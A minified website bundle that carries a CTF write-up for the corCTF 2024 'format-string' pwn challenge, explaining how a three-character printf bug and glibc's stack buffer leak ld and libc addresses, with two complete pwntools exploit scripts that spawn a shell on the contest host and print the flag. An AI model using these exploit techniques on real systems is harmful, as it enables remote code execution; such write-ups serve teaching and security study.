"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2992],{81:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>c,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"ctf-writeups/corctf-2024/format-string","title":"format-string","description":"","source":"@site/pwn/ctf-writeups/corctf-2024/format-string.md","sourceDirName":"ctf-writeups/corctf-2024","slug":"/ctf-writeups/corctf-2024/format-string","permalink":"/pwn/ctf-writeups/corctf-2024/format-string","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"description":"","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"corCTF 2024","permalink":"/pwn/category/corctf-2024"},"next":{"title":"corchat v3","permalink":"/pwn/ctf-writeups/corctf-2024/corchat-v3"}}');var t=i(4848),r=i(8453);const c={description:"",sidebar_position:1},l="format-string",o={},a=[{value:"Introduction",id:"introduction",level:2},{value:"Reversing",id:"reversing",level:2},{value:"do_printf",id:"do_printf",level:3},{value:"do_call",id:"do_call",level:3},{value:"Leaking libc",id:"leaking-libc",level:2},{value:"Floating point?",id:"floating-point",level:3},{value:"%s",id:"s",level:3},{value:"Hang on, what?",id:"hang-on-what",level:3},{value:"The buffer",id:"the-buffer",level:4},{value:"Why in rsi?",id:"why-in-rsi",level:4},{value:"ld leak to libc leak",id:"ld-leak-to-libc-leak",level:3},{value:"Solution",id:"solution",level:2},{value:"Alternative Solution",id:"alternative-solution",level:2}];function d(e){const n={a:"a",br:"br",code:"code",del:"del",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"format-string",children:"format-string"})}),"\n",(0,t.jsx)(n.h2,{id:"introduction",children:"Introduction"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (134).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"format-string"})," was the easy pwn challenge from this CTF, which I unfortunately only managed to solve 1 hour after the CTF concluded due to my focus on another pwn challenge ",(0,t.jsx)(n.code,{children:"corchat_v3"}),". While the description claims you'll learn nothing, I would argue that the mechanisms which allow this challenge to be solvable at all are interesting, even if they're quite lucky."]}),"\n",(0,t.jsx)(n.h2,{id:"reversing",children:"Reversing"}),"\n",(0,t.jsxs)(n.p,{children:["Running ",(0,t.jsx)(n.code,{children:"pwn checksec"})," reveals we have maximum protections (minus ",(0,t.jsx)(n.code,{children:"FORTIFY"}),")."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (137).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:["We're also given the source code and, given the name of the challenge, it's very obvious to spot that the problem here is ",(0,t.jsx)(n.del,{children:"using C"})," a ",(0,t.jsx)(n.code,{children:"printf"})," vuln in the aptly-named ",(0,t.jsx)(n.code,{children:"do_printf"}),"."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n\nvoid do_printf()\n{\n    char buf[4];\n\n    if (scanf("%3s", buf) <= 0)\n        exit(1);\n\n    printf("Here: ");\n    printf(buf);\n}\n\nvoid do_call()\n{\n    void (*ptr)(const char *);\n\n    if (scanf("%p", &ptr) <= 0)\n        exit(1);\n\n    ptr("/bin/sh");\n}\n\nint main()\n{\n    int choice;\n\n    setvbuf(stdin, 0, 2, 0);\n    setvbuf(stdout, 0, 2, 0);\n\n    while (1)\n    {\n        puts("1. printf");\n        puts("2. call");\n\n        if (scanf("%d", &choice) <= 0)\n            break;\n\n        switch (choice)\n        {\n            case 1:\n                do_printf();\n                break;\n            case 2:\n                do_call();\n                break;\n            default:\n                puts("Invalid choice!");\n                exit(1);\n        }\n    }\n\n    return 0;\n}\n'})}),"\n",(0,t.jsx)(n.h3,{id:"do_printf",children:"do_printf"}),"\n",(0,t.jsxs)(n.p,{children:["It uses ",(0,t.jsx)(n.code,{children:'scanf("%3s", buf)'})," to read in the format string, meaning we only have a maximum of 3 characters (plus a null byte) to construct a format string. This is barely enough to do anything meaningful, and immediately rules out anything like ",(0,t.jsx)(n.code,{children:"%n"})," overwrites or ",(0,t.jsx)(n.code,{children:"%[num]$p"})," leaks."]}),"\n",(0,t.jsx)(n.h3,{id:"do_call",children:"do_call"}),"\n",(0,t.jsxs)(n.p,{children:["We also have ",(0,t.jsx)(n.code,{children:"do_call"}),", which prompts us for the memory address of a function to call with ",(0,t.jsx)(n.code,{children:"/bin/sh"}),". The obvious idea here is to use ",(0,t.jsx)(n.code,{children:"system"}),", and we get our shell, but for that we'd need a libc leak."]}),"\n",(0,t.jsx)(n.p,{children:"So the plan would seem obvious:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Use ",(0,t.jsx)(n.code,{children:"do_printf"})," to leak libc"]}),"\n",(0,t.jsxs)(n.li,{children:["Use ",(0,t.jsx)(n.code,{children:"do_call"})," to get a shell"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"leaking-libc",children:"Leaking libc"}),"\n",(0,t.jsx)(n.p,{children:"So with the size restriction of 3 characters, what do we have available?"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"We only have enough room for 1 format string"}),"\n",(0,t.jsxs)(n.li,{children:["Any of the regular specifiers of the form: ",(0,t.jsx)(n.code,{children:"%[specifier]"})," (here's a ",(0,t.jsx)(n.a,{href:"https://cplusplus.com/reference/cstdio/printf/",children:"list of specifiers"}),")"]}),"\n",(0,t.jsxs)(n.li,{children:["We can pad specifiers: ",(0,t.jsx)(n.code,{children:"%[0-9][specifier]"})]}),"\n",(0,t.jsxs)(n.li,{children:["We can use variable width specifiers: ",(0,t.jsx)(n.code,{children:"%*[specifier]"})]}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:["The description tells us that it's a common specifier, so let's try ",(0,t.jsx)(n.code,{children:"%p"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (135).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["Before ",(0,t.jsx)("code",{children:'printf("%p")'})]})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (136).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["After ",(0,t.jsx)("code",{children:'printf("%p")'})]})})]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"%p"})," (and most specifiers that we can use) will access the first argument (besides the format string), so it looks at ",(0,t.jsx)(n.code,{children:"rsi"}),". In our case, it just so happens that ",(0,t.jsx)(n.code,{children:"rsi"})," is set to some stack address after the first ",(0,t.jsx)(n.code,{children:'printf("Here: ")'}),", which also interestingly points to the string ",(0,t.jsx)(n.code,{children:"Here:"})," ",(0,t.jsx)(n.del,{children:"(I'm sure that won't be significant later)"}),"."]}),"\n",(0,t.jsxs)(n.p,{children:["So we can get a stack leak at the very least, but this doesn't help much. ",(0,t.jsx)(n.code,{children:"NX"})," is enabled, so we can't jump to the stack, but even if we could, we'd struggle to write any shellcode due to the small buffer size."]}),"\n",(0,t.jsxs)(n.p,{children:["Many of the remaining specifiers aren't very useful either, as most of them would be different ways of printing integers, so they'd only print that stack address back to us, but just in different forms.",(0,t.jsx)(n.br,{}),"\n",(0,t.jsx)(n.code,{children:"%s"})," doesn't seem that useful at first either, as it would just print ",(0,t.jsx)(n.code,{children:"Here:"})," back to us."]}),"\n",(0,t.jsx)(n.h3,{id:"floating-point",children:"Floating point?"}),"\n",(0,t.jsxs)(n.p,{children:["One idea I had however was floating point specifiers like ",(0,t.jsx)(n.code,{children:"%f"}),". The reason these are interesting is because they would access different arguments, as in, they wouldn't use ",(0,t.jsx)(n.code,{children:"rsi"}),". To see this, let's have a closer look at ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/printf.c#L27",children:"printf"}),":"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:"int\n__printf (const char *format, ...)\n{\n  va_list arg;\n  int done;\n\n  va_start (arg, format);\n  done = __vfprintf_internal (stdout, format, arg, 0);\n  va_end (arg);\n\n  return done;\n}\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Not much to see here, except for the use of variadic arguments using ",(0,t.jsx)(n.code,{children:"va_list"}),". You'll probably be familiar with the fact that ",(0,t.jsx)(n.code,{children:"va_list"})," allows for an unlimited number arguments. It stores the argument registers, plus a pointer to the stack arguments. But it doesn't just store the general purpose (gp) registers (",(0,t.jsx)(n.code,{children:"rdi"}),", ",(0,t.jsx)(n.code,{children:"rsi"}),", ",(0,t.jsx)(n.code,{children:"rdx"}),", ",(0,t.jsx)(n.code,{children:"rcx"}),", ",(0,t.jsx)(n.code,{children:"r8"}),", ",(0,t.jsx)(n.code,{children:"r9"}),"), it can also store the floating point (fp) registers (",(0,t.jsx)(n.code,{children:"xmm0-7"}),"):"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (138).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:["Here we see that the fp registers can be saved to ",(0,t.jsx)(n.code,{children:"[rsp+0x50]"})," if ",(0,t.jsx)(n.code,{children:"al != 0"}),", because in a call to a variadic function, ",(0,t.jsx)(n.code,{children:"al"})," contains the number of fp registers used as arguments, so if any fp registers are used, we should save them."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (139).png",alt:""}),(0,t.jsx)("figcaption",{})]}),"\n",(0,t.jsxs)(n.p,{children:["Since the program doesn't use floating point arguments, it sets ",(0,t.jsx)(n.code,{children:"al"})," to ",(0,t.jsx)(n.code,{children:"0"})," both times, which means that section of memory is left uninitialised, and if we're lucky, could have a libc address."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (140).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"First fp argument"})})]}),"\n",(0,t.jsx)(n.p,{children:"And it seems like we may have been lucky? If we can use a floating point specifier which can cover the full 16 bytes, we may be able to leak it as a floating point number, then convert it back. Unfortunately there is no such specifier."}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"%f"})," is a ",(0,t.jsx)(n.code,{children:"float"})," (32 bits) and ",(0,t.jsx)(n.code,{children:"%lf"})," is a ",(0,t.jsx)(n.code,{children:"double"})," (64 bits), which aren't enough to cover it. While there is ",(0,t.jsx)(n.code,{children:"%Lf"}),", which is for a ",(0,t.jsx)(n.code,{children:"long double"}),", on x86 this only covers 80 bits, not 128. Also it seems that these ",(0,t.jsx)(n.code,{children:"long double"})," arguments are passed using the stack, and so it won't be accessing ",(0,t.jsx)(n.code,{children:"[rsp+0x50]"})," anyway, it'll instead use the stack arguments (which overlap with the ",(0,t.jsx)(n.code,{children:"do_printf"})," buffer), which are useless for us:"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (141).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Stack arguments"})})]}),"\n",(0,t.jsx)(n.h3,{id:"s",children:"%s"}),"\n",(0,t.jsxs)(n.p,{children:["It turns out that the description wasn't lying when it said it was a widely used specifier (shocker). But doesn't ",(0,t.jsx)(n.code,{children:"%s"})," just leak the string ",(0,t.jsx)(n.code,{children:"Here:"})," ?"]}),"\n",(0,t.jsxs)(n.p,{children:["Well, my teammate ",(0,t.jsx)(n.a,{href:"https://x.com/ir0nstone",children:"ir0nstone"})," found something interesting that happens when you do ",(0,t.jsx)(n.code,{children:"%p"})," then ",(0,t.jsx)(n.code,{children:"%s"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (142).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:[(0,t.jsx)("code",{children:"%p"})," then ",(0,t.jsx)("code",{children:"%s"})]})})]}),"\n",(0,t.jsxs)(n.p,{children:["The 2nd ",(0,t.jsx)(n.code,{children:"%s"})," now contains the tail end of the ",(0,t.jsx)(n.code,{children:"%p"})," output, which is quite interesting. It implies that ",(0,t.jsx)(n.code,{children:"rsi"})," points to some internal stack buffer that the output gets copied to."]}),"\n",(0,t.jsxs)(n.p,{children:["So what if now you do ",(0,t.jsx)(n.code,{children:"%s"})," followed by some character. In theory, this could append the character to the buffer, as it would output the current buffer + an extra character, which must be copied to this buffer."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (143).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Appending characters"})})]}),"\n",(0,t.jsx)(n.p,{children:"And sure enough this works! Now if this is just some stack buffer, there could be uninitialised stack data inside it, which we could pad up to and print back to us. We can verify this with the following script:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\ne = context.binary = ELF(\'chal_patched\')\n\nsend_choice = lambda c: p.sendlineafter(b"2. call\\n", str(c).encode())\ndef printf(fmt):\n\tsend_choice(1)\n\tp.sendline(fmt.encode())\n\tp.recvuntil(b"Here: ")\n\treturn p.recvuntil(b"1. printf", drop=True)\n\np = e.process()\n\nl = log.progress("")\nbuf = b"Here: "\nfor i in range(0x2000):\n\tl.status(f"{i}/{0x2000}")\n\tout = printf("%sX")\n\tif out != buf + b"X"*(i+1):\n\t\tbreak\nl.success(f"Found at {i}!")\n\nprint(out)\n'})}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (145).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:"Finding stack data"})})]}),"\n",(0,t.jsx)(n.h3,{id:"hang-on-what",children:"Hang on, what?"}),"\n",(0,t.jsx)(n.p,{children:"This is some weird behaviour, and seems quite lucky for us (which it is). Understandably I had questions."}),"\n",(0,t.jsx)(n.h4,{id:"the-buffer",children:"The buffer"}),"\n",(0,t.jsxs)(n.p,{children:["First of all, what is this stack buffer? And also why is there a buffer at all, isn't ",(0,t.jsx)(n.code,{children:"stdout"})," supposed to be unbuffered?"]}),"\n",(0,t.jsxs)(n.p,{children:["To answer these, let's look further into ",(0,t.jsx)(n.code,{children:"printf"}),". We saw that it calls ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1288",children:"vfprintf"}),", so lets start there."]}),"\n",(0,t.jsxs)(n.p,{children:["It starts off by doing some sanity checks, but then checks if the file is unbuffered, and if it is, it will call ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L2343",children:"buffered_vfprintf"}),":"]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (147).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L1343",children:"vfprintf"})})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (146).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("code",{children:"buffered_vfprintf"})})})]}),"\n",(0,t.jsxs)(n.p,{children:['It seems that when the file is unbuffered, it creates a "helper file" on the stack that uses a ',(0,t.jsx)(n.em,{children:"stack buffer"}),', and then it prints to the "helper file". This seems like such a hack (cos it is), but thankfully it helps us out, because ',(0,t.jsx)(n.code,{children:"CHAR_T buf[BUFSIZ]"})," is where the output goes before it's written out."]}),"\n",(0,t.jsx)(n.h4,{id:"why-in-rsi",children:"Why in rsi?"}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (149).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L2395",children:(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L2395",children:"https://elixir.bootlin.com/glibc/glibc-2.31/source/stdio-common/vfprintf-internal.c#L2395"})})})})]}),"\n",(0,t.jsxs)(n.p,{children:['After it gets printed to the "helper file", the output sits in the stack buffer, and now needs to be written out to stdout. It does this by calling ',(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L1197",children:"_IO_sputn"}),", which goes on to call the ",(0,t.jsx)(n.code,{children:"write"})," syscall in ",(0,t.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L1173",children:"_IO_new_file_write"}),"."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (152).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsxs)("p",{children:["Invoking ",(0,t.jsx)("code",{children:"write"})," syscall"]})})]}),"\n",(0,t.jsxs)(n.p,{children:["This is where ",(0,t.jsx)(n.code,{children:"rsi"})," would be set to the buffer, and from this point the ",(0,t.jsx)(n.code,{children:"rsi"})," register remains untouched. The main reason for this is the fact that no function calls (with 2+ arguments) take place after this, so it never gets clobbered."]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (153).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L449",children:"new_do_write"})})})]}),"\n",(0,t.jsxs)("figure",{children:[(0,t.jsx)("img",{src:"/assets/image (154).png",alt:""}),(0,t.jsx)("figcaption",{children:(0,t.jsx)("p",{children:(0,t.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/fileops.c#L1255",children:"_IO_new_file_xsputn"})})})]}),"\n",(0,t.jsxs)(n.p,{children:['However there is still an element of "luck", because ',(0,t.jsx)(n.code,{children:"rdi"})," is clobbered by ",(0,t.jsx)(n.code,{children:"_IO_funlockfile"})," (see ",(0,t.jsx)(n.a,{href:"../../pwn/rop-2.34+/ret2gets#io_stdfile_0_lock-in-rdi",children:"here"}),"), and ",(0,t.jsx)(n.code,{children:"rdx"})," gets clobbered as a scratch register."]}),"\n",(0,t.jsx)(n.h3,{id:"ld-leak-to-libc-leak",children:"ld leak to libc leak"}),"\n",(0,t.jsxs)(n.p,{children:["In my solution I used the first address I found (the one found by the script) for my leak. Unfortunately this address was an ld address (",(0,t.jsx)(n.code,{children:"_dl_process_pt_note+539"}),"), not libc. However, due to how the libraries are mapped, for each system the offsets between the libraries are deterministic, so we can convert this into a libc leak."]}),"\n",(0,t.jsxs)(n.p,{children:["The offset for my system was ",(0,t.jsx)(n.code,{children:"0x1f4000"}),", but remotely I had to fiddle a bit to find that it was ",(0,t.jsx)(n.code,{children:"0x1f6000"})," (not the cleanest way to do it, but oh well)."]}),"\n",(0,t.jsx)(n.h2,{id:"solution",children:"Solution"}),"\n",(0,t.jsxs)(n.p,{children:["Armed with a libc leak, we can now call ",(0,t.jsx)(n.code,{children:"do_call"})," and get RCE."]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = context.binary = ELF(\'chal_patched\')\nlibc = ELF(\'libc-2.31.so\', checksec=False)\nld = ELF(\'ld-2.31.so\', checksec=False)\nif args.REMOTE:\n\tip, port = "be.ax", 32323\n\tconn = lambda: remote(ip, port)\n\tLIBC_TO_LD = 0x1f4000 + 0x1000*(2)\nelse:\n\tconn = lambda: e.process()\n\tLIBC_TO_LD = 0x1f4000\n\nsend_choice = lambda c: p.sendlineafter(b"2. call\\n", str(c).encode())\n\ndef printf(fmt):\n\tsend_choice(1)\n\tp.sendline(fmt.encode())\n\tp.recvuntil(b"Here: ")\n\treturn p.recvuntil(b"1. printf", drop=True)\n\ndef call(func):\n\tsend_choice(2)\n\tp.sendline(hex(func).encode())\n\np = conn()\n\nleak_off = 0x1248\ndelim = b"Here: ".ljust(leak_off, b"X")\n\n# send all this in one go to speed up remote\np.send(b"1\\n%sX\\n" * (leak_off - len("Here: ")))\np.recvuntil(delim)\n\nld_leak = u64(printf("%sX")[leak_off:leak_off+6] + b"\\x00\\x00")\nlog.info(f"ld_leak: {hex(ld_leak)}")\n\nld.address = ld_leak - (ld.sym._dl_process_pt_note+539)\nlog.info(f"ld: {hex(ld.address)}")\n\nlibc.address = ld.address - LIBC_TO_LD\nlog.info(f"libc: {hex(libc.address)}")\n\ncall(libc.sym.system)\np.interactive()\n# corctf{w4CKy_$tr1NG-f0rm4T!}\n'})}),"\n",(0,t.jsx)(n.h2,{id:"alternative-solution",children:"Alternative Solution"}),"\n",(0,t.jsxs)(n.p,{children:["The above is my solution, but there was another approach that was shared on the discord after the event finished, which involved the variable width specifier: ",(0,t.jsx)(n.code,{children:"%*x"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"The variable width specifier allows the user to specify the width for an argument as an argument:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>\n\nint main() {\n    printf("|%*d|\\n", 10, 69);\n    printf("|%*d|\\n", -10, 69);\n}\n\n/*\nOUTPUT:\n|        69|\n|69        |\n*/\n'})}),"\n",(0,t.jsxs)(n.p,{children:["This can be useful in some printf exploits using ",(0,t.jsx)(n.code,{children:"%n"}),", as you can use the lower 32 bits of an address as a width, and print a variable number of bytes depending on that address (here's an ",(0,t.jsx)(n.a,{href:"https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/",children:"example"}),")."]}),"\n",(0,t.jsxs)(n.p,{children:["In our case however, it would use ",(0,t.jsx)(n.code,{children:"rsi"})," as a width and, since thats an address, it will print ",(0,t.jsx)(n.strong,{children:"a lot"})," of bytes (most of which are spaces). This is useful because this amount of printing will fill up the buffer, and then when another function is called (like ",(0,t.jsx)(n.code,{children:"scanf"}),"), it will clobber the stack buffer with its stack usage, leaving behind addresses. Now the buffer has spaces padding up to some address, which in our case happens to be ",(0,t.jsx)(n.code,{children:"_IO_2_1_stdin_"}),", which we can print."]}),"\n",(0,t.jsx)(n.p,{children:"Below is my implementation of this solution (I opted to find a process with a low width, so that the exploit would run quicker remotely)."}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/python3\nfrom pwn import *\n\ne = context.binary = ELF(\'chal_patched\')\nlibc = ELF(\'libc-2.31.so\', checksec=False)\nld = ELF(\'ld-2.31.so\', checksec=False)\nif args.REMOTE:\n\tip, port = "be.ax", 32323\n\tconn = lambda: remote(ip, port, level="error")\n\tMAX_WIDTH = 1*(1<<28)\nelse:\n\tconn = lambda: e.process(level="error")\n\tMAX_WIDTH = 2*(1<<28)\n\nsend_choice = lambda c: p.sendlineafter(b"2. call\\n", str(c).encode())\n\ndef printf(fmt):\n\tsend_choice(1)\n\tp.sendline(fmt.encode())\n\tp.recvuntil(b"Here: ")\n\treturn p.recvuntil(b"1. printf", drop=True)\n\ndef call(func):\n\tsend_choice(2)\n\tp.sendline(hex(func).encode())\n\n# find a process with a low width\nwhile True:\n\tp = conn()\n\n\twidth = abs(int(printf("%d")))\n\tlog.info(f"width: {hex(width)}")\n\tif width <= MAX_WIDTH:\n\t\tbreak\n\tp.close()\n\nl = log.progress("filling buffer")\n# fill buffer\nprintf("%*x")\nl.success("done")\n\nlibc_leak = u64(printf("%s")[-6:] + b"\\x00\\x00")\nlog.info(f"libc leak: {hex(libc_leak)}")\n\nlibc.address = libc_leak - libc.sym._IO_2_1_stdin_\nlog.info(f"libc: {hex(libc.address)}")\n\ncall(libc.sym.system)\np.interactive()\n# corctf{w4CKy_$tr1NG-f0rm4T!}\n'})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},8453:(e,n,i)=>{i.d(n,{R:()=>c,x:()=>l});var s=i(6540);const t={},r=s.createContext(t);function c(e){const n=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);